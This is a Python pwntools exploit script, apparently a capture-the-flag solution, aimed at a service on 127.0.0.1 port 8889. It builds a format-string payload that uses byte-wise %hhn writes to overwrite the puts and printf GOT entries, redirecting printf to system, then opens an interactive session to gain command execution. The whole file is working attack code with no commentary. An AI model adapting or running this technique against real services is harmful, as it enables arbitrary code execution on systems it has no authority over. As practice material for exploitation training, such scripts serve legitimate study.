#!/usr/bin/env python
from pwn import *

host = "127.0.0.1"
port = 8889
r = remote(host,port)
puts_got = 0x601018
printf_got = 0x601030
system_plt = 0x4005a0
context.arch = "amd64"
def fmt(prev,val,index):
	result = ""
	if prev < val:
		result = "%"+str(val-prev)+"c"
	if prev == val:
		result = ""
	if prev > val:
		result = "%"+str(val-prev+256)+"c"
	result += "%"+str(index)+"$hhn"
	return result
prev = 0
payload = ""
target = 0x0000000000400747
for i in range(6):
	payload += fmt(prev,(target >> i*8) & 0xff,22+i+4)
	prev = (target >> i*8) & 0xff
for i in range(6):
	payload += fmt(prev,(system_plt >> i*8) & 0xff,22+i+4+6)
	prev = (system_plt >> i*8) & 0xff

payload = payload.ljust(0x80+0x20,"a") 
payload += flat([puts_got,puts_got+1,puts_got+2,puts_got+3,puts_got+4,puts_got+5])
payload += flat([printf_got,printf_got+1,printf_got+2,printf_got+3,printf_got+4,printf_got+5])
r.sendline(payload)
r.interactive()
